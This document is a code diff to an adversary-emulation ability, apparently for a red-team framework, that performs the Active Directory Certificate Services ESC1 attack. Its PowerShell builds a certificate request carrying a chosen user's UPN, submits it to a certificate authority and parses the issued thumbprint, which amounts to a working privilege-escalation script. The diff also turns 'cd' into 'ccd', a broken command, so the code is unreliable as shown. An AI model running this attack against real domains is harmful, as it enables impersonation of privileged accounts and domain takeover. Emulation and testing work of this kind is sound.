@@ -13,22 +13,22 @@
     windows:
       psh:
         command: |
-          cd "C:\Users\Public";
+          ccd "C:\Users\Public";
           $shortname = "#{esc1.target_user}";
           $upn = "$shortname@#{domain.name}";
           $template = "#{esc1.template}";
-          $inf = @"
-          [NewRequest]
-          Subject = "CN=$shortname"
-          Exportable = TRUE
-          KeyLength = 2048
-          KeySpec = 1
-          ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
-          RequestType = PKCS10
-
-          [Extensions]
-          2.5.29.17 = "{text}upn=$upn"
-          "@;
+          $inf = @(
+            "[NewRequest]",
+            "Subject = `"CN=$shortname`"",
+            "Exportable = TRUE",
+            "KeyLength = 2048",
+            "KeySpec = 1",
+            "ProviderName = `"Microsoft RSA SChannel Cryptographic Provider`"",
+            "RequestType = PKCS10",
+            "",
+            "[Extensions]",
+            "2.5.29.17 = `"{text}upn=$upn`""
+          ) -join "`n";
           Set-Content -Path "request.inf" -Value $inf -Force;
           certreq.exe -new request.inf request.req;
           certreq.exe -submit -attrib "CertificateTemplate:$template" -config "#{adcs.ca.name_full}" request.req cert.cer;
@@ -37,5 +37,5 @@
           plugins.adversary_emulation.app.parsers.regex_parser:
             - source: 'adcs.cert.thumbprint'
               custom_parser_vals:
-                regex: 'Created-Cert-Thumbprint:\s+(.*)'
+                regex: 'Thumbprint:\s+(.*)'
                 edge_label: 'is_thumbprint_for_cert'
